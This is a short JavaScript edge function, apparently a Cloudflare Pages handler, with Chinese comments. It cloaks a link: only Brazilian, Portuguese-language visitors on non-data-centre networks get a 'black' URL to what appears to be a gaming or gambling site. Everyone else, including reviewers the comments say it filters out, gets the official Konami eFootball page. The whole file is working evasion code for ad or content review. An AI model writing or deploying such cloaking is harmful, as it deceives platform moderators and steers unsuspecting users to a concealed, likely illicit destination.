export async function onRequest(context) {
  const { request } = context;
  const cf = request.cf;
  const headers = request.headers;
  const acceptLang = (headers.get("accept-language") || "").toLowerCase();
  
  // 获取原始 HTML 模板
  const response = await context.next();
  let html = await response.text();

  // === 目标地址配置 ===
  const BLACK_URL = "https://p7game1.xyz/?ch=290101"; 
  const WHITE_URL = "https://www.konami.com/efootball/pt-br/"; 
  const TOKEN = "###SECURE_ACCESS_TOKEN###"; 

  // === 物理隔离核心逻辑 ===
  
  // 1. 地理位置锁定：必须是巴西 (BR)
  const isBR = cf.country === "BR";

  // 2. 语言环境匹配：浏览器语言必须包含葡萄牙语 (pt)
  // 能够过滤绝大多数非葡语国家的审核员。
  const isPT = acceptLang.includes("pt");

  // 3. 深度清洗：排除主流云服务商与审计机构机房
  const asnOrg = (cf.asOrganization || "").toLowerCase();
  const isDataCenter = /google|amazon|microsoft|facebook|akamai|cloudflare|linode|digitalocean|vultr|ovh|m247|zenlayer|choopa|leaseweb|hetzner|fastly/i.test(asnOrg);

  // === 最大包容性判定 ===
  // 核心原则：是巴西 IP 且 具有葡萄牙语特征 且 不是知名机房 IP
  const isRealUser = isBR && isPT && !isDataCenter;

  // 执行静默替换
  const finalHtml = html.split(TOKEN).join(isRealUser ? BLACK_URL : WHITE_URL);

  return new Response(finalHtml, {
    headers: { 
      "content-type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store, no-cache" // 防止缓存导致的分流错误
    }
  });
}